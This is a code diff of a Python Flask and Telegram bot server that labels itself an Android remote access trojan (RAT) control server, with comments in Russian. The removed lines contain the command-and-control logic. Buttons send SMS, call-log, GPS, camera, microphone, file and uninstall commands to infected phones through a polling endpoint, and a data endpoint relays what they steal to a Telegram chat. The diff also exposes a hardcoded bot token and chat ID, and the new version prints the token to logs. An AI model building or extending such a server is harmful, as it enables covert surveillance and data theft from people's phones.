@@ -1,65 +1,58 @@
 import os
-import threading
-from flask import Flask, request, jsonify
-from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, CallbackContext
+import time
+import requests
+import traceback
+from flask import Flask
+from telegram import Bot
+from telegram.ext import Updater, CommandHandler
 
-BOT_TOKEN = '8637699821:AAEWDlUoj5lWMARCp-0dsEzcPjvyK8xgB_Q'
+app = Flask(__name__)
+
+BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
 CHAT_ID = '7803661441'
 
-bot = Bot(token=BOT_TOKEN)
-app = Flask(__name__)
-latest_command = {"cmd": "none"}
+print("🔍 Старт приложения...")
+print("🔍 BOT_TOKEN =", BOT_TOKEN)
+
+# Проверка: может ли бот отправить сообщение при старте
+try:
+    bot_check = Bot(BOT_TOKEN)
+    bot_check.send_message(chat_id=CHAT_ID, text="🟢 Бот запускается на сервере...")
+    print("✅ Тестовое сообщение отправлено!")
+except Exception as e:
+    print("❌ Ошибка при отправке тестового сообщения:")
+    traceback.print_exc()
+
+def start(update, context):
+    update.message.reply_text('✅ Бот активен! Используй /info')
+
+def info(update, context):
+    update.message.reply_text('📡 RAT сервер работает!')
+
+def run_bot():
+    try:
+        updater = Updater(BOT_TOKEN, use_context=True)
+        dp = updater.dispatcher
+        dp.add_handler(CommandHandler("start", start))
+        dp.add_handler(CommandHandler("info", info))
+        updater.start_polling()
+        print("✅ Бот запущен и слушает сообщения!")
+        updater.idle()
+    except Exception as e:
+        print("❌ Ошибка в run_bot:")
+        traceback.print_exc()
+
+import threading
+threading.Thread(target=run_bot, daemon=True).start()
 
 @app.route('/')
 def home():
-    return "✅ RAT СЕРВЕР РАБОТАЕТ!", 200
+    return "✅ RAT сервер работает!", 200
 
 @app.route('/health')
 def health():
     return "OK", 200
 
-@app.route('/get_command', methods=['GET'])
-def get_command():
-    cmd = latest_command["cmd"]
-    if cmd != "none":
-        latest_command["cmd"] = "none"
-    return {"command": cmd}
-
-@app.route('/send_data', methods=['POST'])
-def send_data():
-    data = request.get_json()
-    if data and 'message' in data:
-        bot.send_message(chat_id=CHAT_ID, text=f"📱 Данные с устройства:\n{data['message']}")
-    return "OK", 200
-
-def start(update: Update, context: CallbackContext):
-    keyboard = [
-        [InlineKeyboardButton("📱 ИНФО", callback_data='info'), InlineKeyboardButton("📍 GPS", callback_data='location')],
-        [InlineKeyboardButton("💬 СМС", callback_data='sms'), InlineKeyboardButton("📞 ЗВОНКИ", callback_data='calls')],
-        [InlineKeyboardButton("📷 КАМЕРА", callback_data='camera'), InlineKeyboardButton("🎙️ МИКРОФОН", callback_data='mic')],
-        [InlineKeyboardButton("📁 ФАЙЛЫ", callback_data='files'), InlineKeyboardButton("🗑️ УДАЛИТЬ", callback_data='uninstall')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    update.message.reply_text('✅ Android RAT АКТИВИРОВАН. Выберите действие:', reply_markup=reply_markup)
-
-def button_callback(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    command = query.data
-    latest_command["cmd"] = command
-    query.edit_message_text(text=f"✅ Команда '{command}' отправлена на устройство.")
-
-def run_bot():
-    dispatcher = Dispatcher(bot, None, use_context=True)
-    dispatcher.add_handler(CommandHandler("start", start))
-    dispatcher.add_handler(CallbackQueryHandler(button_callback))
-    dispatcher.bot.delete_webhook()
-    dispatcher.start_polling()
-    dispatcher.idle()
-
 if __name__ == '__main__':
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
